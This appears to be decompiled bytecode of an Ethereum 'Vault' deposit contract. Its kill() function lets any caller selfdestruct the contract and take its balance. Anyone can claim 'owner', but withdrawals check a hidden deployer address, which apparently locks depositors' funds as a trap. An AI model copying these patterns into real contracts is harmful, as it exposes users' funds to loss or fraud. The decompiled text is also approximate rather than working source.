contract main {


// =======================  Init code  ======================


address stor0;

function _fallback() payable {
    stor0 = msg.sender
    require not msg.value
    return code.data[52 len 981]
}



// =====================  Runtime code  =====================


address stor0;
address owner;
mapping of uint256 deposits;

function Deposits(address arg1) {
    return deposits[arg1]
}

function Owner() {
    return owner
}

function kill() payable {
    if eth.balance(this.address):
    selfdestruct(msg.sender)
}

function deposit() payable {
    if msg.value >= 10^17:
        deposits[address(msg.sender)] += msg.value
        emit Deposit(msg.value);
}

function _fallback() payable {
    if msg.value >= 10^17:
        deposits[address(msg.sender)] += msg.value
        emit Deposit(msg.value);
}

function Vault() payable {
    owner = msg.sender
    if msg.value >= 10^17:
        deposits[address(msg.sender)] += msg.value
        emit Deposit(msg.value);
}

function withdraw(uint256 arg1) payable {
    if stor0 == msg.sender:
        if deposits[address(msg.sender)] > 0:
            if arg1 <= deposits[address(msg.sender)]:
                call msg.sender with:
                   value arg1 wei
                     gas 2300 * is_zero(value) wei
                emit Withdraw(arg1);
}

function withdrawToken(address arg1, uint256 arg2) payable {
    if stor0 == msg.sender:
        require ext_code.size(arg1)
        call arg1.0x70a08231 with:
             gas gas_remaining - 50 wei
            args this.address
        require ext_call.success
        if ext_call.return_data[0] >= arg2:
            require ext_code.size(arg1)
            call arg1.0xa9059cbb with:
                 gas gas_remaining - 50 wei
                args msg.sender, arg2
            require ext_call.success
}



}
